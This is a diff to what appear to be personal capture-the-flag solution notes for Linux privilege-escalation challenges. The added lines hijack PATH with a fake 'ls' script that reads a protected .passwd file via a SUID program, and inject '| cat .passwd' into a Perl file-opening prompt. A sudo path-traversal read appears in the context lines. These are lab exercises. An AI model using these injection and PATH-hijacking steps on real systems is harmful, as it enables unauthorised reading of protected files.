@@ -8,3 +8,17 @@ export PATH=/tmp:$PATH
 
 sudo -u <user> cat /challenge/<my_user>/<path_with_access>/../<other_path>/.passwd
 
+## SUID Shell Scripts 2
+
+mkdir /tmp/challenge
+echo '#!/bin/sh' > /tmp/challenge/ls; echo '/bin/cat /<path>/.passwd' >> /tmp/challenge/ls; chmod +x /tmp/challenge/ls
+./<program_name>
+
+## Perl injection
+
+./<program_opening_file> 
+*************************
+* Stat File Service    *
+*************************
+>>> | cat .passwd
+
